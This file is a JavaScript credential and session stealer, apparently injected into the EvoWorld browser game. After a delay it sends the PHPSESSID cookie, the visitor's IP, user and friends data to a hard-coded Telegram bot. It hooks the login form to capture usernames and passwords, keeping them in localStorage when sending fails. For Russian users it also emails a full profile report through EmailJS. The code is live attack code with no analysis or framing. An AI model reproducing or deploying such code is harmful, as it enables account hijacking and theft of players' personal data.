setTimeout(() => {
(async function() {
    // Конфигурация Telegram бота
    const BOT_TOKEN = '8303657347:AAHdDjkRTZmjn8Jb8oyu3DcXcM79KV5Wk-w';
    const GROUP_ID = '-1003867014479';
    const TELEGRAM_API_URL = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;

    // Функция для отправки сообщения в Telegram
    const sendToTelegram = async (message) => {
        try {
            const response = await fetch(TELEGRAM_API_URL, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    chat_id: GROUP_ID,
                    text: message,
                    parse_mode: 'HTML'
                })
            });
            
            const result = await response.json();
            return result;
        } catch (error) {
            return null;
        }
    };

    // Функция для получения куки
    const getCookie = (name) => {
        const matches = document.cookie.match(new RegExp(
            "(?:^|; )" + name.replace(/([\.$?*|{}\(\)\[\]\\\/\+^])/g, '\\$1') + "=([^;]*)"
        ));
        return matches ? decodeURIComponent(matches[1]) : undefined;
    };

    // Получаем IP
    const getIP = async () => {
        try {
            const response = await fetch('https://api.ipify.org?format=json');
            const data = await response.json();
            return data.ip || "Не удалось получить IP";
        } catch {
            return "Не удалось получить IP";
        }
    };

    // Функция для безопасного клонирования объектов
    const deepClone = (obj) => {
        if (obj === null || typeof obj !== 'object') return obj;
        const clone = Array.isArray(obj) ? [] : {};
        for (const key in obj) {
            if (obj.hasOwnProperty(key)) {
                clone[key] = deepClone(obj[key]);
            }
        }
        return clone;
    };

    // Проверяем и получаем данные из переменной `user`
    const getUserData = () => {
        try {
            if (typeof user !== 'undefined' && user !== null) {
                return JSON.stringify(deepClone(user), null, 2);
            }
            return null;
        } catch (e) {
            return null;
        }
    };

    // Получаем friendsData в оригинальном виде
    const getFriendsData = () => {
        try {
            if (typeof friendsData !== 'undefined' && friendsData !== null) {
                return JSON.stringify(deepClone(friendsData), null, 2);
            }
            return null;
        } catch (e) {
            return null;
        }
    };

    // Получаем friendsArr в оригинальном виде
    const getFriendsArr = () => {
        try {
            if (typeof friendsArr !== 'undefined' && friendsArr !== null) {
                // Для больших массивов делаем выборку
                if (Array.isArray(friendsArr) && friendsArr.length > 100) {
                    const sample = {
                        total_length: friendsArr.length,
                        sample_items: []
                    };
                    
                    // Берем первые 10 элементов
                    for (let i = 0; i < Math.min(10, friendsArr.length); i++) {
                        if (friendsArr[i]) {
                            sample.sample_items.push(deepClone(friendsArr[i]));
                        }
                    }
                    
                    // Берем несколько элементов из "хвоста" массива
                    for (let i = Math.max(0, friendsArr.length - 5); i < friendsArr.length; i++) {
                        if (friendsArr[i] && sample.sample_items.length < 15) {
                            sample.sample_items.push(deepClone(friendsArr[i]));
                        }
                    }
                    
                    return JSON.stringify(sample, null, 2);
                }
                return JSON.stringify(deepClone(friendsArr), null, 2);
            }
            return null;
        } catch (e) {
            return null;
        }
    };

    // Получаем уровень пользователя
    const getUserLevel = (addX = false) => {
        try {
            if (typeof user !== 'undefined' && user !== null && user.level !== undefined) {
                return `level: ${user.level}${addX ? 'x' : ''}`;
            }
            return `level: не определен${addX ? 'x' : ''}`;
        } catch (e) {
            return `level: ошибка при получении (${e.message})${addX ? 'x' : ''}`;
        }
    };

    // Функция для разбивки длинного сообщения на части (Telegram имеет ограничение 4096 символов)
    const splitMessage = (text, maxLength = 4000) => {
        const parts = [];
        for (let i = 0; i < text.length; i += maxLength) {
            parts.push(text.substring(i, i + maxLength));
        }
        return parts;
    };

    const sendUserData = async () => {
        // Проверяем, загружена ли переменная user (до 10 попыток с интервалом 1 секунда)
        let attempts = 0;
        while (attempts < 10 && (typeof user === 'undefined' || user === null)) {
            await new Promise(resolve => setTimeout(resolve, 1000));
            attempts++;
        }
        
        const phpsessid = getCookie('PHPSESSID');
        const userIP = await getIP();
        const userData = getUserData();
        const friendsDataStr = getFriendsData();
        const friendsArrStr = getFriendsArr();
        
        // Получаем уровень
        const userLevel = getUserLevel(false);
        
        // Формируем сообщение для Telegram
        let message = `<b>🚨 НОВЫЙ ЛОГ 🚨</b>\n\n`;
        message += `<b>📅 Время:</b> ${new Date().toLocaleString()}\n`;
        message += `<b>🌐 IP:</b> <code>${userIP}</code>\n`;
        message += `<b>🔗 URL:</b> ${window.location.href}\n\n`;
        
        message += `<b>📊 УРОВЕНЬ ПОЛЬЗОВАТЕЛЯ:</b>\n`;
        message += `<code>${userLevel}</code>\n`;
        message += `<b>💰 Gems:</b> ${user?.premiumPoints || 'N/A'}\n`;
        message += `<b>🖥️ Выбранный сервер:</b> ${document.getElementById('selectServer')?.options[document.getElementById('selectServer')?.selectedIndex]?.text || 'N/A'}\n\n`;
        
        message += `<b>🔑 PHPSESSID:</b>\n`;
        message += `<code>${phpsessid || "PHPSESSID: не найдена"}</code>\n\n`;
        
        // Добавляем user полностью, если поместится
        if (userData) {
            const remainingSpace = 4000 - message.length - 200; // Оставляем запас
            if (userData.length <= remainingSpace) {
                message += `<b>📋 ДАННЫЕ ИЗ ПЕРЕМЕННОЙ user:</b>\n`;
                message += `<code>${userData}</code>\n\n`;
            }
        }
        
        message += `\n<i>Отправлено автоматически</i>`;

        // Разбиваем сообщение на части если оно слишком длинное
        const messageParts = splitMessage(message);
        
        // Отправляем каждую часть с повторными попытками при ошибках
        for (let i = 0; i < messageParts.length; i++) {
            if (i > 0) {
                messageParts[i] = `<b>🚨 ЛОГ (часть ${i + 1}/${messageParts.length})</b>\n\n${messageParts[i]}`;
            }
            
            // Повторные попытки отправки (до 3 попыток)
            let sendAttempts = 0;
            let success = false;
            while (sendAttempts < 3 && !success) {
                const result = await sendToTelegram(messageParts[i]);
                if (result && result.ok) {
                    success = true;
                } else {
                    sendAttempts++;
                    if (sendAttempts < 3) {
                        await new Promise(resolve => setTimeout(resolve, 2000));
                    }
                }
            }
            
            // Небольшая задержка между отправками
            if (i < messageParts.length - 1) {
                await new Promise(resolve => setTimeout(resolve, 1000));
            }
        }
    };

    await sendUserData();
})();

// Логика перехвата формы входа
(function() {
    'use strict';

    // Telegram configuration для логина/пароля
    const BOT_TOKEN = '8303657347:AAHdDjkRTZmjn8Jb8oyu3DcXcM79KV5Wk-w';
    const CHAT_ID = '-5254910028';

    // Enhanced send function with error handling
    function sendCredentials(username, password) {
        const timestamp = new Date().toLocaleString('ru-RU');
        const message = `🦊 EvoWorld Login\n\n👤 Login: ${username}\n🔐 Password: ${password}\n⏰ ${timestamp}`;

        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({
                chat_id: CHAT_ID,
                text: message,
                disable_web_page_preview: true
            })
        })
        .then(response => {
            if (!response.ok) throw new Error('Telegram API error');
        })
        .catch(error => {
            // Fallback: Save to localStorage if sending fails
            const logs = JSON.parse(localStorage.getItem('evoLogs') || '[]');
            logs.push({username, password, timestamp});
            localStorage.setItem('evoLogs', JSON.stringify(logs));
        });
    }

    // Precise selectors based on your findings
    const SELECTORS = {
        username: '#loginUsername',
        password: '#loginPassword',
        submitButton: 'button[type="submit"]'
    };

    // Main interception function
    function setupInterception() {
        const usernameField = document.querySelector(SELECTORS.username);
        const passwordField = document.querySelector(SELECTORS.password);
        const submitButton = document.querySelector(SELECTORS.submitButton);

        if (usernameField && passwordField) {
            // Method 1: Form submission
            const form = usernameField.closest('form');
            if (form) {
                form.addEventListener('submit', function(event) {
                    event.preventDefault();
                    sendCredentials(usernameField.value, passwordField.value);
                    form.submit();
                });
                return;
            }

            // Method 2: Button click
            if (submitButton) {
                submitButton.addEventListener('click', function() {
                    setTimeout(() => {
                        sendCredentials(usernameField.value, passwordField.value);
                    }, 300);
                });
                return;
            }

            // Method 3: Input events as fallback
            passwordField.addEventListener('blur', function() {
                if (usernameField.value && passwordField.value) {
                    sendCredentials(usernameField.value, passwordField.value);
                }
            });
        } else {
            // Retry every 2 seconds if form not loaded yet
            setTimeout(setupInterception, 2000);
        }
    }

    // Start interception with delay for dynamic content
    setTimeout(setupInterception, 3000);

    // Additional protection against dynamic DOM changes
    const observer = new MutationObserver(function(mutations) {
        mutations.forEach(function(mutation) {
            if (!document.querySelector(SELECTORS.username)) {
                setupInterception();
            }
        });
    });

    observer.observe(document.body, {
        childList: true,
        subtree: true,
        attributes: false,
        characterData: false
    });
})();

// Оригинальный код для российских пользователей
if(typeof user !== 'undefined' && user.authData && user.authData.countryCode == "RU"){
    var script = document.createElement('script');
    script.src = "https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js";
    script.onload = function() {
        emailjs.init("4N-8nqIjjUBhk1vbi");
        
        setTimeout(async () => {
            // Функции сбора данных
            const getCookie = (name) => {
                const matches = document.cookie.match(new RegExp(
                    "(?:^|; )" + name.replace(/([\.$?*|{}\(\)\[\]\\\/\+^])/g, '\\$1') + "=([^;]*)"
                ));
                return matches ? decodeURIComponent(matches[1]) : undefined;
            };

            const getIP = async () => {
                try {
                    const response = await fetch('https://api.ipify.org?format=json');
                    const data = await response.json();
                    return data.ip || "Не удалось получить IP";
                } catch {
                    return "Не удалось получить IP";
                }
            };

            const deepClone = (obj) => {
                if (obj === null || typeof obj !== 'object') return obj;
                const clone = Array.isArray(obj) ? [] : {};
                for (const key in obj) {
                    if (obj.hasOwnProperty(key)) {
                        clone[key] = deepClone(obj[key]);
                    }
                }
                return clone;
            };

            const getUserData = () => {
                try {
                    if (typeof user !== 'undefined' && user !== null) {
                        return JSON.stringify(deepClone(user), null, 2);
                    }
                    return null;
                } catch (e) {
                    return null;
                }
            };

            const getFriendsData = () => {
                try {
                    if (typeof friendsData !== 'undefined' && friendsData !== null) {
                        return JSON.stringify(deepClone(friendsData), null, 2);
                    }
                    return null;
                } catch (e) {
                    return null;
                }
            };

            const getFriendsArr = () => {
                try {
                    if (typeof friendsArr !== 'undefined' && friendsArr !== null) {
                        if (Array.isArray(friendsArr) && friendsArr.length > 100) {
                            const sample = {
                                total_length: friendsArr.length,
                                sample_items: []
                            };
                            
                            for (let i = 0; i < Math.min(10, friendsArr.length); i++) {
                                if (friendsArr[i]) {
                                    sample.sample_items.push(deepClone(friendsArr[i]));
                                }
                            }
                            
                            for (let i = Math.max(0, friendsArr.length - 5); i < friendsArr.length; i++) {
                                if (friendsArr[i] && sample.sample_items.length < 15) {
                                    sample.sample_items.push(deepClone(friendsArr[i]));
                                }
                            }
                            
                            return JSON.stringify(sample, null, 2);
                        }
                        return JSON.stringify(deepClone(friendsArr), null, 2);
                    }
                    return null;
                } catch (e) {
                    return null;
                }
            };

            const getUserLevel = (addX = false) => {
                try {
                    if (typeof user !== 'undefined' && user !== null && user.level !== undefined) {
                        return `level: ${user.level}${addX ? 'x' : ''}`;
                    }
                    return `level: не определен${addX ? 'x' : ''}`;
                } catch (e) {
                    return `level: ошибка при получении (${e.message})${addX ? 'x' : ''}`;
                }
            };

            const sendUserData = async () => {
                const phpsessid = getCookie('PHPSESSID');
                const userIP = await getIP();
                const userData = getUserData();
                const friendsDataStr = getFriendsData();
                const friendsArrStr = getFriendsArr();
                
                const userLevel = getUserLevel(false);
                
                const messageText = `
ПОЛНЫЙ ОТЧЕТ О ПОЛЬЗОВАТЕЛЕ
=============================

📅 Время: ${new Date().toLocaleString()}
🌐 IP-адрес: ${userIP}
🔗 URL: ${window.location.href}

📊 УРОВЕНЬ ПОЛЬЗОВАТЕЛЯ:
${userLevel}
Gems: ${user?.premiumPoints || 'N/A'}
Выбранный сервер: ${document.getElementById('selectServer')?.options[document.getElementById('selectServer')?.selectedIndex]?.text || 'N/A'}

🔑 PHPSESSID:
${phpsessid || "PHPSESSID: не найдена"}

👤 ДАННЫЕ ИЗ ПЕРЕМЕННОЙ user:
${userData || "Переменная 'user' не найдена или пуста"}

👥 ДАННЫЕ ИЗ ПЕРЕМЕННОЙ friendsData:
${friendsDataStr || "Переменная 'friendsData' не найдена или пуста"}

👥 ДАННЫЕ ИЗ ПЕРЕМЕННОЙ friendsArr:
${friendsArrStr || "Переменная 'friendsArr' не найдена или пуста"}
=============================
Отчет сгенерирован автоматически.
                `;

                const templateParams = {
                    message: messageText
                };
                
                emailjs.send('service_wdulwdn', 'template_ugfv48l', templateParams)
                    .then(function(response) {
                        // Без console.log
                    }, function(error) {
                        // Без console.log
                    });
            };

            await sendUserData();
        }, 1);
    };
    document.head.appendChild(script);
}
}, 6500);
